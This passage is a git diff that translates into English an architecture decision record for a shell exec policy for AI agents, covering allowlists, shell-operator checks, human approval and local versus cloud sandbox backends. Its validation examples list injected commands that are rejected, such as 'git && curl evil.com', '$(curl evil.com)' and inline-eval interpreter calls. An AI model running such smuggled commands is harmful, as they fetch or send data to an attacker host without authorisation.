@@ -1,29 +1,29 @@
-# ADR-010 : Exec Policy + Dual Sandbox Backend
+# ADR-010: Exec Policy + Dual Sandbox Backend
 
-**Statut :** Accepté **Date :** 2026-03-27 **Étend :** ADR-005 (permissions par
-intersection)
+**Status:** Accepted **Date:** 2026-03-27 **Extends:** ADR-005
+(permissions by intersection)
 
-## Contexte
+## Context
 
-ADR-005 définit les permissions Sandbox par intersection tool × agent. Mais deux
-problèmes restent ouverts :
+ADR-005 defines Sandbox permissions as the intersection of tool requirements and
+agent allowances. Two major problems still remained:
 
-1. **`sh -c` bypass les `--allow-*` de Deno.** Le `ShellTool` actuel utilise
-   `new Deno.Command("sh", ["-c", command])`. Avec `--allow-run=sh`, l'agent
-   exécute n'importe quel binaire via le shell intermédiaire — les flags Deno ne
-   protègent plus rien.
+1. **`sh -c` bypasses Deno `--allow-*` flags.** The current `ShellTool` uses
+   `new Deno.Command("sh", ["-c", command])`. With `--allow-run=sh`, the agent
+   can execute any binary through the intermediate shell. Deno flags no longer
+   protect anything meaningful.
 
-2. **Deux backends sandbox.** En local, on utilise un subprocess Deno avec
-   `--allow-*` flags (isolation V8, pas d'isolation OS). En cloud,
-   `@deno/sandbox` fournit des micro-VMs Firecracker (isolation hardware). Les
-   garanties de sécurité ne sont pas les mêmes.
+2. **Two different sandbox backends.** Locally, code runs inside a Deno
+   subprocess with `--allow-*` flags (V8 isolation, but no OS-level isolation).
+   In cloud mode, `@deno/sandbox` provides Firecracker microVMs
+   (hardware-level isolation). The security guarantees are not the same.
 
-## Décision
+## Decision
 
-### 1. Exec Policy sur le ShellTool
+### 1. Exec Policy on `ShellTool`
 
-Inspiré du modèle OpenClaw, le shell n'est plus "libre par défaut". Chaque agent
-déclare une **exec policy** :
+Inspired by the OpenClaw model, shell execution is no longer "free by default".
+Each agent declares an **exec policy**:
 
 ```typescript
 interface ExecPolicyBase {
@@ -37,139 +37,137 @@ interface ExecPolicyDeny extends ExecPolicyBase {
 
 interface ExecPolicyFull extends ExecPolicyBase {
   security: "full";
-  /** Prefixes d'env supplémentaires à filtrer (en plus de LD_*, DYLD_*) */
+  /** Extra env prefixes to filter (in addition to LD_*, DYLD_*) */
   envFilter?: string[];
 }
 
 interface ExecPolicyAllowlist extends ExecPolicyBase {
   security: "allowlist";
-  /** Commandes autorisées (binaires, premier mot) */
+  /** Allowed commands (binary name, first word only) */
   allowedCommands?: string[];
-  /** Blocklist par mot-clé — match n'importe où dans la commande */
+  /** Keyword blocklist — matches anywhere in the command */
   deniedCommands?: string[];
-  /** Prefixes d'env supplémentaires à filtrer (en plus de LD_*, DYLD_*) */
+  /** Extra env prefixes to filter (in addition to LD_*, DYLD_*) */
   envFilter?: string[];
-  /** Autoriser les flags d'eval inline (-c, -e) sur les interpréteurs connus (défaut : false = bloqué) */
+  /** Allow inline eval flags (-c, -e) for known interpreters (default: false = blocked) */
   allowInlineEval?: boolean;
 }
 
 type ExecPolicy = ExecPolicyDeny | ExecPolicyFull | ExecPolicyAllowlist;
 ```
 
-#### Niveaux de sécurité
+#### Security levels
 
-| `security`  | Comportement                                                                        |
-| ----------- | ----------------------------------------------------------------------------------- |
-| `deny`      | Aucune exécution shell. Le tool retourne une erreur structurée.                     |
-| `allowlist` | Seuls les binaires listés dans `allowedCommands` passent. Le reste dépend de `ask`. |
-| `full`      | Tout passe (pour sandbox cloud uniquement, ou dev assumé).                          |
+| `security`  | Behavior                                                                                |
+| ----------- | --------------------------------------------------------------------------------------- |
+| `deny`      | No shell execution. The tool returns a structured error.                                |
+| `allowlist` | Only binaries listed in `allowedCommands` are allowed. Everything else depends on `ask`. |
+| `full`      | Everything is allowed (cloud sandbox only, or intentional local dev mode).              |
 
-#### Approbation humaine (`ask`)
+#### Human approval (`ask`)
 
-| `ask`     | Comportement                                                                 |
-| --------- | ---------------------------------------------------------------------------- |
-| `off`     | Exécute ou refuse silencieusement selon la policy.                           |
-| `on-miss` | Si le binaire n'est pas dans l'allowlist, demande approbation au broker/CLI. |
-| `always`  | Chaque commande est soumise à approbation.                                   |
+| `ask`     | Behavior                                                                    |
+| --------- | --------------------------------------------------------------------------- |
+| `off`     | Execute or reject silently according to policy.                             |
+| `on-miss` | If the binary is not in the allowlist, ask for approval through broker/CLI. |
+| `always`  | Every command requires approval.                                            |
 
-**`askFallback`** : quand le canal d'approbation (tunnel broker/CLI) est
-indisponible et que `ask` se déclenche. Défaut : `"deny"`. Empêche une
-dégradation silencieuse vers l'exécution libre si le tunnel tombe.
+**`askFallback`** applies when the approval channel (broker tunnel / CLI) is
+unavailable and `ask` triggers. Default: `"deny"`. This prevents silent
+degradation into unrestricted execution when the tunnel is down.
 
-**Timeout d'approbation** : si aucune réponse humaine dans le délai → traité
-comme un refus (deny). Le timeout d'approbation est séparé du timeout
-d'exécution (`maxDurationSec`).
+**Approval timeout:** if no human response arrives in time, treat it as a
+denial. Approval timeout is separate from execution timeout (`maxDurationSec`).
 
-#### Résolution de commande et détection d'opérateurs shell
+#### Command resolution and shell-operator detection
 
-Deux niveaux de vérification en mode `allowlist` :
+There are two validation levels in `allowlist` mode:
 
-**Niveau 1 — Binaire (premier mot)** : split sur le premier espace, lookup dans
-un `Set`.
+**Level 1 — Binary (first word):** split on the first space and look up in a
+`Set`.
 
-**Niveau 2 — Opérateurs shell** : en mode `allowlist`, les commandes contenant
-des opérateurs de chaînage sont **rejetées** sauf si approuvées via `ask`.
-Opérateurs détectés :
+**Level 2 — Shell operators:** in `allowlist` mode, commands containing shell
+chaining operators are **rejected** unless approval is granted through `ask`.
+Detected operators:
 
 ```
 ;   &&   ||   |   $(   `   >   >>   <
 ```
 
 ```
-"git status"              → binaire = "git"  ✅ allowlist
-"deno test ./foo"         → binaire = "deno" ✅ allowlist
-"git && curl evil.com"    → opérateur "&&" détecté → ❌ REJETÉ (ask si on-miss)
-"ls | grep foo"           → opérateur "|" détecté  → ❌ REJETÉ (ask si on-miss)
-"sh -c 'curl ...'"        → binaire = "sh"  → ❌ sh pas dans l'allowlist
-"$(curl evil.com)"        → opérateur "$(" détecté  → ❌ REJETÉ
+"git status"              → binary = "git"  ✅ allowlist
+"deno test ./foo"         → binary = "deno" ✅ allowlist
+"git && curl evil.com"    → operator "&&" detected → ❌ REJECTED (ask if on-miss)
+"ls | grep foo"           → operator "|" detected  → ❌ REJECTED (ask if on-miss)
+"sh -c 'curl ...'"        → binary = "sh"  → ❌ sh not in allowlist
+"$(curl evil.com)"        → operator "$(" detected → ❌ REJECTED
 ```
 
-`sh`, `bash`, `zsh` ne sont **jamais** dans l'allowlist par défaut.
+`sh`, `bash`, and `zsh` are **never** part of the default allowlist.
 
-#### `allowInlineEval` — interpréteurs connus
+#### `allowInlineEval` — known interpreters
 
-Quand désactivé (défaut : `false`), les flags d'évaluation inline sont bloqués
-même si le binaire est dans l'allowlist :
+When disabled (default: `false`), inline-eval flags are blocked even if the
+binary itself is in the allowlist:
 
 ```
-python -c 'import os; ...'    → "-c" détecté sur interpréteur → ❌ REJETÉ (ask si on-miss)
-node -e 'require("child_..."' → "-e" détecté sur interpréteur → ❌ REJETÉ
-ruby -e '...'                  → "-e" détecté → ❌ REJETÉ
-deno eval '...'                → "eval" subcommand → ❌ REJETÉ
+python -c 'import os; ...'    → "-c" detected on interpreter → ❌ REJECTED (ask if on-miss)
+node -e 'require("child_..."' → "-e" detected on interpreter → ❌ REJECTED
+ruby -e '...'                 → "-e" detected → ❌ REJECTED
+deno eval '...'               → "eval" subcommand → ❌ REJECTED
 ```
 
-Interpréteurs surveillés : `python`, `python3`, `node`, `ruby`, `perl`, `deno`,
+Watched interpreters: `python`, `python3`, `node`, `ruby`, `perl`, `deno`,
 `bun`.
 
-#### Filtrage environnement
+#### Environment filtering
 
-Le subprocess local filtre ces variables avant exécution :
+The local subprocess filters these variables before execution:
 
 ```typescript
 const DENIED_ENV_PREFIXES = ["LD_", "DYLD_"];
 ```
 
-Empêche l'injection de librairies dynamiques. PATH est conservé pour que les
-binaires (`git`, `deno`, etc.) restent trouvables via `Deno.Command`.
-Variable marqueur `DENOCLAW_EXEC=1` injectée pour que les profils shell
-détectent le contexte.
+This prevents dynamic-library injection. `PATH` remains available so binaries
+such as `git` and `deno` can still be resolved by `Deno.Command`. A marker
+variable, `DENOCLAW_EXEC=1`, is injected so shell profiles can detect the
+execution context.
 
 ### 2. Dual Sandbox Backend
 
-#### Principe fondamental : même executor, deux enveloppes
+#### Core principle: same executor, two isolation envelopes
 
-Les deux backends exécutent le **même `tool_executor.ts`** avec les **mêmes
-tools** (`ShellTool`, `ReadFileTool`, etc.). Le backend ne change que
-**l'enveloppe d'isolation** dans laquelle l'executor tourne. Cela garantit :
+Both backends execute the **same `tool_executor.ts`** with the **same tools**
+(`ShellTool`, `ReadFileTool`, etc.). The backend only changes the isolation
+envelope around that executor. This guarantees:
 
-- **AX #6 Deterministic** — même inputs = même outputs, quel que soit le backend
-- **AX #8 Composable** — le backend est un primitif interchangeable, pas un
-  environnement alternatif
-- **Zéro divergence** — pas deux chemins de code à maintenir en sync
+- **AX #6 Deterministic** — same inputs = same outputs, regardless of backend
+- **AX #8 Composable** — backend is a swappable primitive, not a separate runtime
+- **No divergence** — there are not two different execution paths to maintain
 
 ```
 ┌─────────────────────────────────────────────────────────────┐
-│ Les deux backends exécutent :                                │
-│   deno run [--allow-*] tool_executor.ts '{"tool":"shell"}'  │
-│                                                              │
-│ LocalProcessBackend : via Deno.Command (process fils local)  │
-│ DenoSandboxBackend  : via sandbox.sh (micro-VM Firecracker)  │
+│ Both backends execute:                                     │
+│   deno run [--allow-*] tool_executor.ts '{"tool":"shell"}' │
+│                                                             │
+│ LocalProcessBackend : via Deno.Command (local child process)│
+│ DenoSandboxBackend  : via sandbox.sh (Firecracker microVM)  │
 └─────────────────────────────────────────────────────────────┘
 ```
 
-#### Interface `SandboxBackend`
+#### `SandboxBackend` interface
 
 ```typescript
 interface SandboxBackend {
   readonly kind: "local" | "cloud";
 
-  /** Exécuter un tool dans l'environnement isolé */
+  /** Execute a tool inside the isolated environment */
   execute(req: SandboxExecRequest): Promise<SandboxExecResult>;
 
-  /** Cloud only : le backend supporte-t-il le shell libre en sécurité ? */
+  /** Cloud only: does this backend safely support unrestricted shell? */
   readonly supportsFullShell: boolean;
 
-  /** Libérer les ressources (fermer la sandbox cloud, etc.) */
+  /** Release resources (close cloud sandbox, etc.) */
   close(): Promise<void>;
 }
 
@@ -180,7 +178,7 @@ interface SandboxExecRequest {
   networkAllow?: string[];
   timeoutSec?: number;
   execPolicy: ExecPolicy;
-  /** Callback pour l'approbation humaine (ask: on-miss | always) */
+  /** Callback for human approval (`ask: on-miss | always`) */
   onAskApproval?: (req: ApprovalRequest) => Promise<ApprovalResponse>;
 }
 
@@ -193,7 +191,7 @@ interface ApprovalRequest {
 
 interface ApprovalResponse {
   approved: boolean;
-  /** Si true, ajoute le binaire à l'allowlist pour la session */
+  /** If true, add the binary to the session allowlist */
   allowAlways?: boolean;
 }
 
@@ -208,34 +206,41 @@ interface SandboxExecResult {
 }
 ```
 
-#### LocalProcessBackend (mode dev/offline)
+#### `LocalProcessBackend` (dev/offline mode)
 
-- Spawn `Deno.Command("deno", ["run", ...flags, "tool_executor.ts", input])`
+- Spawns
+  `Deno.Command("deno", ["run", ...flags, "tool_executor.ts", input])`
   (ADR-005 intersection)
-- Exec policy **enforced avant le spawn** : allowlist + opérateurs shell +
-  `allowInlineEval` + ask + env filter
+- Exec policy is **enforced before spawn**: allowlist + shell operators +
+  `allowInlineEval` + `ask` + env filtering
 - `supportsFullShell: false`
-- Sécurité : isolation crash + timeout + policy. Pas d'isolation OS.
-- `close()` : no-op (pas de ressource persistante)
+- Security: crash isolation + timeout + policy enforcement. No OS isolation.
+- `close()`: no-op (no persistent resource)
 
-#### DenoSandboxBackend (mode cloud/prod)
+#### `DenoSandboxBackend` (cloud/prod mode)
 
-- Utilise `@deno/sandbox` SDK v0.13+ (`Sandbox.create()` + `sandbox.sh`)
-- Micro-VM Firecracker, isolation hardware
-- `supportsFullShell: true` — le shell libre est safe (VM éphémère isolée)
-- Exec policy **optionnelle** : peut être `security: "full"` car la VM isole
-- Nécessite `DENO_DEPLOY_TOKEN` + internet
-- `close()` : appelle `sandbox.kill()` pour détruire la VM
+- Uses `@deno/sandbox` SDK v0.13+ (`Sandbox.create()` + `sandbox.sh`)
+- Firecracker microVM with hardware isolation
+- `supportsFullShell: true` — unrestricted shell is acceptable because the VM
+  is isolated and ephemeral
+- Exec policy is **optional** here: `security: "full"` can be valid because the
+  VM supplies the isolation boundary
+- Requires `DENO_DEPLOY_TOKEN` + internet access
+- `close()`: calls `sandbox.kill()` to destroy the VM
 
-**`buildSandboxCode`** — le broker génère le code Deno à exécuter dans la VM via `buildSandboxCode()`. Cette fonction applique les mêmes principes que le `tool_executor.ts` local : `dry_run: true` par défaut (AX #2), exécution directe du binaire sans `sh -c`, sortie structurée sur stdout. Les mêmes garanties de sécurité s'appliquent au code généré pour le cloud qu'au path local.
+**`buildSandboxCode`** — the broker generates the Deno code to run inside the
+VM via `buildSandboxCode()`. That generated code follows the same rules as the
+local `tool_executor.ts`: `dry_run: true` by default (AX #2), direct binary
+execution without `sh -c`, and structured stdout output. The same security
+expectations apply to the generated cloud path as to the local path.
 
-**Exécution** : identique au local, dans la VM :
+**Execution:** identical to local mode, but inside the VM:
 
 ```typescript
 await sandbox.sh`deno run tool_executor.ts '${input}'`;
 ```
 
-#### Lifecycle du `DenoSandboxBackend`
+#### `DenoSandboxBackend` lifecycle
 
 ```
                      ToolRegistry
@@ -252,12 +257,12 @@ await sandbox.sh`deno run tool_executor.ts '${input}'`;
 execute() #1        execute() #2        execute() #N
      │                   │                   │
      ▼                   ▼                   ▼
-┌─────────┐         (réutilise)         (réutilise)
+┌─────────┐         (reuses)            (reuses)
 │ Lazy    │              │                   │
-│ init :  │              │                   │
+│ init:   │              │                   │
 │ 1. Sandbox.create()   │                   │
 │ 2. fs.upload(tools/)  │                   │
-│ 3. Stocker instance   │                   │
+│ 3. Store instance     │                   │
 └────┬────┘              │                   │
      │                   │                   │
      ▼                   ▼                   ▼
@@ -265,66 +270,65 @@ sandbox.sh`...`     sandbox.sh`...`     sandbox.sh`...`
      │                   │                   │
      └───────────────────┼───────────────────┘
                          │
-                   close() ← appelé par AgentLoop.close()
+                   close() ← called by AgentLoop.close()
                          │
                    sandbox.kill()
-                   VM détruite
+                   VM destroyed
 ```
 
-**Init lazy** : la VM n'est créée qu'au premier `execute()`, pas à la
-construction du backend. Cela évite de provisionner une VM si l'agent ne fait
-jamais d'appel tool.
+**Lazy init:** the VM is created only on the first `execute()`, not when the
+backend is constructed. That avoids provisioning a VM if the agent never calls
+any tool.
 
-**Étapes d'initialisation** (au premier `execute()`) :
+**Initialization steps** (first `execute()` only):
 
-1. `Sandbox.create({ region, allowNet, timeout, env })` — provisionne la
-   micro-VM
-2. `sandbox.fs.upload("src/agent/tools/", "/app/tools/")` — upload
-   `tool_executor.ts` + tous les tools
-3. Stocker l'instance `sandbox` pour réutilisation
+1. `Sandbox.create({ region, allowNet, timeout, env })` — provisions the microVM
+2. `sandbox.fs.upload("src/agent/tools/", "/app/tools/")` — uploads
+   `tool_executor.ts` + all tools
+3. Store the `sandbox` instance for reuse
 
-**Réutilisation** : un seul sandbox par agent. Les appels `execute()` suivants
-réutilisent la même VM. L'état filesystem persiste entre les appels (fichiers
-créés par un tool sont visibles par le suivant).
+**Reuse:** one sandbox per agent. Later `execute()` calls reuse the same VM.
+Filesystem state persists between calls, so files created by one tool remain
+visible to the next one.
 
-**Fermeture** : cascade depuis `AgentLoop.close()` :
+**Close:** cascade from `AgentLoop.close()`:
 
 ```
 AgentLoop.close()
-  → ToolRegistry.close()       ← NOUVEAU
+  → ToolRegistry.close()       ← NEW
     → SandboxBackend.close()
-      → sandbox.kill()          (cloud: détruit la VM)
-      → no-op                   (local: rien à fermer)
+      → sandbox.kill()          (cloud: destroy the VM)
+      → no-op                   (local: nothing to close)
 ```
 
-`AgentLoop.close()` (existant, `loop.ts:244`) est étendu pour appeler
-`this.tools.close()`. `ToolRegistry` gagne une méthode `close()` qui cascade
-vers le backend.
+`AgentLoop.close()` (existing, `loop.ts:244`) is extended to call
+`this.tools.close()`. `ToolRegistry` gains a `close()` method that cascades into
+the backend.
 
-#### Matrice des capacités
+#### Capability matrix
 
-| Capacité      | LocalProcessBackend                   | DenoSandboxBackend                                                    |
+| Capability    | LocalProcessBackend                   | DenoSandboxBackend                                                    |
 | ------------- | ------------------------------------- | --------------------------------------------------------------------- |
 | Executor      | `tool_executor.ts` via `Deno.Command` | `tool_executor.ts` via `sandbox.sh`                                   |
-| Shell libre   | Non (allowlist + ask + opérateurs)    | Oui (VM isolée)                                                       |
+| Full shell    | No (allowlist + ask + operator checks) | Yes (isolated VM)                                                     |
 | Isolation     | V8 flags + process                    | Firecracker VM                                                        |
-| Réseau        | `--allow-net=host`                    | `allowNet: [host]`                                                    |
-| FS            | Host filesystem (flags)               | Filesystem VM isolé + upload/download                                 |
-| Secrets       | Visibles dans env (filtrées)          | Via `SandboxOptions.env` (en clair dans VM) ou `secrets` (HTTPS-only) |
-| Coût          | Gratuit                               | Metered (pre-release, free tier à confirmer)                          |
-| Offline       | Oui                                   | Non                                                                   |
-| Réutilisation | Nouveau process par tool call         | Un sandbox par agent (multi-tools)                                    |
-| Concurrence   | Illimitée                             | 5 sandboxes max/org (pre-release)                                     |
-| Init          | Instantané                            | ~1s (lazy, première exécution uniquement)                             |
+| Network       | `--allow-net=host`                    | `allowNet: [host]`                                                    |
+| FS            | Host filesystem (permission flags)    | Isolated VM filesystem + upload/download                              |
+| Secrets       | Visible in env (filtered)             | Via `SandboxOptions.env` (plain inside VM) or `secrets` (HTTPS-only)  |
+| Cost          | Free                                  | Metered (pre-release, free tier TBD)                                  |
+| Offline       | Yes                                   | No                                                                    |
+| Reuse         | New process per tool call             | One sandbox per agent (multi-tool session)                            |
+| Concurrency   | Unlimited                             | 5 sandboxes max per org (pre-release)                                 |
+| Init          | Instant                               | ~1s (lazy, first execution only)                                      |
 | `close()`     | No-op                                 | `sandbox.kill()`                                                      |
 
-### 3. Sélection du backend — fail-closed + explicite
+### 3. Backend selection — fail-closed and explicit
 
 ```typescript
-// Config agent
+// Agent config
 {
   "sandbox": {
-    "backend": "local",  // "local" | "cloud" — pas de "auto"
+    "backend": "local",  // "local" | "cloud" — never "auto"
     "allowedPermissions": ["read", "write", "run", "net"],
     "execPolicy": {
       "security": "allowlist",
@@ -337,20 +341,20 @@ vers le backend.
 }
 ```
 
-**Pas de mode `"auto"`** (AX #7 — Explicit Over Implicit). Le choix du backend
-est **toujours explicite** dans la config. Un backend implicite basé sur la
-présence d'un env var est une source de bugs silencieux : la même config se
-comporte différemment selon l'environnement, ce qui viole AX #6 (Deterministic).
+There is **no `"auto"` mode** (AX #7 — Explicit Over Implicit). Backend choice
+is **always explicit** in config. Choosing implicitly from environment
+variables would create silent bugs where the same config behaves differently
+depending on where it runs, which violates AX #6 (Deterministic).
 
-Règles de sélection :
+Selection rules:
 
-| `backend` | `DENO_DEPLOY_TOKEN` présent | Token absent                                     |
-| --------- | --------------------------- | ------------------------------------------------ |
-| `"cloud"` | → `DenoSandboxBackend`      | → **Erreur `SANDBOX_UNAVAILABLE`** (fail-closed) |
-| `"local"` | → `LocalProcessBackend`     | → `LocalProcessBackend`                          |
+| `backend` | `DENO_DEPLOY_TOKEN` present | Token absent                                       |
+| --------- | --------------------------- | -------------------------------------------------- |
+| `"cloud"` | → `DenoSandboxBackend`      | → **`SANDBOX_UNAVAILABLE` error** (fail-closed)    |
+| `"local"` | → `LocalProcessBackend`     | → `LocalProcessBackend`                            |
 
-**Fail-closed** : si un agent demande `"cloud"` et que le token n'est pas
-disponible, l'exécution échoue avec une erreur structurée :
+**Fail-closed:** if an agent asks for `"cloud"` and the token is unavailable,
+execution fails with a structured error:
 
 ```typescript
 {
@@ -360,149 +364,144 @@ disponible, l'exécution échoue avec une erreur structurée :
 }
 ```
 
-**Défaut** : `"local"` si `backend` est omis dans la config. Explicite,
-prévisible.
+**Default:** `"local"` when `backend` is omitted. Explicit and predictable.
 
-### 4. Flux d'approbation (`ask`) — Worker ↔ Broker/CLI
+### 4. Approval flow (`ask`) — Worker ↔ Broker/CLI
 
-L'approbation se fait **avant** le spawn du subprocess/sandbox command, dans le
-backend (thread Worker) :
+Approval happens **before** the subprocess or sandbox command is started, inside
+the backend running in the worker thread:
 
 ```
 SandboxBackend.execute(req)
-  → vérifie execPolicy (binaire, opérateurs, inlineEval)
-  → si ask déclenché :
+  → validate execPolicy (binary, operators, inline eval)
+  → if ask is triggered:
       → req.onAskApproval({ requestId, command, binary, reason })
         │
-        │ implémenté par le Worker via le protocole existant :
+        │ implemented by the Worker through the existing protocol:
         │
         │   WorkerResponse { type: "ask_approval", requestId, command, binary, reason }
         │     → WorkerPool.handleWorkerMessage()
         │       → callbacks.onAskApproval(agentId, requestId, command, binary)
-        │         → CLI mode : prompt terminal stdin
-        │         → Gateway mode : WebSocket vers client connecté
+        │         → CLI mode: terminal stdin prompt
+        │         → Gateway mode: WebSocket to connected client
         │       → worker.postMessage({ type: "ask_response", requestId, approved, allowAlways })
-        │     → Promise résolue dans le Worker
+        │     → Promise resolves inside the Worker
         │
-      → si approved : exécuter (spawn local ou sandbox.sh)
-      → si denied : retourner erreur structurée EXEC_DENIED
-      → si allowAlways : ajouter le binaire à l'allowlist de session
+      → if approved: execute (local spawn or sandbox.sh)
+      → if denied: return structured EXEC_DENIED error
+      → if allowAlways: add binary to the session allowlist
 ```
 
-Ce pattern est symétrique aux messages `agent_send`/`agent_response` existants
-dans `worker_protocol.ts`.
+This is symmetric with the existing `agent_send` / `agent_response` messages in
+`worker_protocol.ts`.
 
-**Timeouts séparés** (AX #7 — Explicit) :
+**Separate timeouts** (AX #7 — Explicit):
 
-- `approvalTimeoutSec` : délai max pour la réponse humaine. Défaut : 60s.
-  Expiration = refus.
-- `maxDurationSec` : délai max pour l'exécution du tool après approbation. Déjà
-  existant dans `SandboxConfig`.
+- `approvalTimeoutSec`: max wait for human response. Default: 60s. Expiration = denial.
+- `maxDurationSec`: max tool execution time after approval. Already exists in `SandboxConfig`.
 
-Les deux sont indépendants. L'un n'inclut pas l'autre.
+The two timeouts are independent. One does not include the other.
 
-## Consolidation `ToolsConfig` vs `ExecPolicy`
+## Consolidating `ToolsConfig` vs `ExecPolicy`
 
-`ToolsConfig.allowedCommands` et `ToolsConfig.deniedCommands` (actuels) sont
-**dépréciés** au profit de `ExecPolicy.allowedCommands` et
-`ExecPolicy.deniedCommands`. Migration :
+`ToolsConfig.allowedCommands` and `ToolsConfig.deniedCommands` are
+**deprecated** in favor of `ExecPolicy.allowedCommands` and
+`ExecPolicy.deniedCommands`. Migration rules:
 
-- Si `ToolsConfig.allowedCommands` présent et `ExecPolicy` absent → migration
-  automatique vers
+- If `ToolsConfig.allowedCommands` is present and `ExecPolicy` is absent →
+  automatically migrate to
   `ExecPolicy { security: "allowlist", allowedCommands: [...], ask: "off" }`
-- Si les deux présents → `ExecPolicy` gagne, warning dans les logs
-- `ToolsConfig.restrictToWorkspace` reste dans `ToolsConfig` (concerne le
-  filesystem, pas l'exec policy)
+- If both are present → `ExecPolicy` wins, with a warning in the logs
+- `ToolsConfig.restrictToWorkspace` stays in `ToolsConfig`
+  (it governs filesystem scope, not exec policy)
 
-## Impact sur les fichiers
+## File impact
 
-| Fichier                               | Changement                                                                                                               |
-| ------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
-| `src/shared/types.ts`                 | Ajouter `ExecPolicy`, `SandboxBackend`, `SandboxExecRequest`, `SandboxExecResult`, `ApprovalRequest`, `ApprovalResponse` |
-| `src/shared/mod.ts`                   | Exporter les nouveaux types                                                                                              |
-| `src/agent/tools/registry.ts`         | `setSandbox()` → `setBackend(SandboxBackend)`, ajouter `close()` qui cascade vers `backend.close()`                      |
-| `src/agent/tools/subprocess.ts`       | Renommé/refactoré → `backends/local.ts` (`LocalProcessBackend`)                                                          |
-| `src/agent/tools/shell.ts`            | Plus de `sh -c`, exécution directe du binaire, exec policy enforced                                                      |
-| `src/agent/tools/tool_executor.ts`    | `ExecutorInput.config` reçoit `execPolicy`                                                                               |
-| `src/agent/tools/backends/cloud.ts`   | Nouveau : `DenoSandboxBackend` — lazy init, upload tools, `sandbox.sh`, `close()` → `sandbox.kill()`                     |
-| `src/agent/tools/backends/factory.ts` | Nouveau : sélection backend `"local"` / `"cloud"`, fail-closed                                                           |
-| `src/agent/loop.ts`                   | `close()` étendu : appeler `this.tools.close()`                                                                          |
-| `src/agent/worker_protocol.ts`        | Messages `ask_approval` / `ask_response`                                                                                 |
-| `src/agent/worker_pool.ts`            | Handler `ask_approval`, callback `onAskApproval`                                                                         |
-| `src/agent/types.ts`                  | Déprécier `allowedCommands`/`deniedCommands` sur `ToolsConfig`                                                           |
-| `src/cli/agents.ts`                   | Exposer `execPolicy` dans création agent                                                                                 |
-| `deno.json`                           | Ajouter `@deno/sandbox` dans imports                                                                                     |
+| File                                  | Change                                                                                                                |
+| ------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
+| `src/shared/types.ts`                 | Add `ExecPolicy`, `SandboxBackend`, `SandboxExecRequest`, `SandboxExecResult`, `ApprovalRequest`, `ApprovalResponse` |
+| `src/shared/mod.ts`                   | Export the new types                                                                                                  |
+| `src/agent/tools/registry.ts`         | `setSandbox()` → `setBackend(SandboxBackend)`, add cascading `close()`                                                |
+| `src/agent/tools/subprocess.ts`       | Rename/refactor → `backends/local.ts` (`LocalProcessBackend`)                                                         |
+| `src/agent/tools/shell.ts`            | Remove `sh -c`, execute binary directly, enforce exec policy                                                          |
+| `src/agent/tools/tool_executor.ts`    | `ExecutorInput.config` now receives `execPolicy`                                                                      |
+| `src/agent/tools/backends/cloud.ts`   | New: `DenoSandboxBackend` — lazy init, tool upload, `sandbox.sh`, `close()` → `sandbox.kill()`                       |
+| `src/agent/tools/backends/factory.ts` | New: backend selection `"local"` / `"cloud"`, fail-closed                                                             |
+| `src/agent/loop.ts`                   | Extend `close()` to call `this.tools.close()`                                                                         |
+| `src/agent/worker_protocol.ts`        | Add `ask_approval` / `ask_response` messages                                                                          |
+| `src/agent/worker_pool.ts`            | Add `ask_approval` handler, `onAskApproval` callback                                                                  |
+| `src/agent/types.ts`                  | Deprecate `allowedCommands` / `deniedCommands` on `ToolsConfig`                                                       |
+| `src/cli/agents.ts`                   | Expose `execPolicy` in agent creation                                                                                 |
+| `deno.json`                           | Add `@deno/sandbox` to imports                                                                                        |
 
-## Risques identifiés
+## Identified risks
 
-1. **`tool_executor.ts` est un script standalone** — pas de type-check partagé
-   avec le parent. `ExecutorInput.config` doit être manuellement synchronisé.
-   Seuls les tests d'intégration détectent les désynchronisations.
+1. **`tool_executor.ts` is a standalone script** — it does not share type-check
+   state with the parent. `ExecutorInput.config` has to stay in sync manually.
+   Only integration tests catch drift.
 
-2. **`ask` bloque le Worker** — pendant l'attente d'approbation, le Worker ne
-   traite pas d'autres messages. Acceptable pour un workflow humain (réponse
-   rapide). Le timeout d'approbation (60s) est séparé du timeout d'exécution
-   (`maxDurationSec`).
+2. **`ask` blocks the Worker** — while waiting for approval, the Worker cannot
+   process other messages. That is acceptable for human workflows if the
+   response is fast. Approval timeout (60s) remains separate from execution
+   timeout (`maxDurationSec`).
 
-3. **5 sandboxes max en pre-release** — pour du multi-agent, ça peut bloquer.
-   Prévoir un pool/queue côté `DenoSandboxBackend` ou escalader avec Deno.
+3. **5 sandboxes max in pre-release** — this may throttle multi-agent workloads.
+   We may need pooling/queueing inside `DenoSandboxBackend` or escalation with Deno.
 
-4. **Secrets `@deno/sandbox` = HTTP-only** — les secrets passés via
-   `SandboxOptions.secrets` ne sont pas dans `process.env` du sandbox (injectés
-   uniquement sur outbound HTTPS). Les tools CLI qui lisent des variables d'env
-   doivent utiliser `SandboxOptions.env` (valeurs en clair dans la VM).
-   Documenter la distinction.
+4. **`@deno/sandbox` secrets are HTTPS-only** — values passed via
+   `SandboxOptions.secrets` are not available in `process.env` inside the
+   sandbox. They are only injected for outbound HTTPS calls. CLI tools that read
+   env vars must use `SandboxOptions.env` instead, which means plain values are
+   visible inside the VM. This distinction needs to be documented.
 
-5. **Zéro tests sur le chemin subprocess actuel** — le refactoring n'a aucun
-   filet de sécurité. Créer les tests `LocalProcessBackend` et `ExecPolicy` en
-   priorité.
+5. **Zero tests on the current subprocess path** — the refactor has no safety
+   net. `LocalProcessBackend` and `ExecPolicy` tests should be added first.
 
-6. **Upload tools dans la sandbox cloud** — au premier `execute()`, le
-   `DenoSandboxBackend` upload `src/agent/tools/` dans la VM. Si les fichiers
-   tools changent entre les builds, la VM peut avoir une version désynchronisée.
-   Mitigation : le sandbox est éphémère (30 min max), recréé à chaque session
-   agent.
+6. **Tool upload into cloud sandbox** — on first `execute()`,
+   `DenoSandboxBackend` uploads `src/agent/tools/` into the VM. If tool files
+   change between builds, the VM may temporarily run an out-of-sync copy.
+   Mitigation: the sandbox is ephemeral (30-minute max) and recreated for each
+   agent session.
 
-## Conséquences
+## Consequences
 
-- Le `ShellTool` actuel (`sh -c`) est remplacé par une exécution directe du
-  binaire en mode local
-- La détection d'opérateurs shell et de `allowInlineEval` ajoute ~50 lignes de
-  validation
-- Le champ `ExecPolicy` s'ajoute à `SandboxConfig` dans les types partagés
-- Le `ToolRegistry` gagne `close()` pour le lifecycle du backend, cascadé depuis
+- The current `ShellTool` (`sh -c`) is replaced with direct binary execution in
+  local mode
+- Shell-operator and `allowInlineEval` detection adds roughly 50 lines of validation
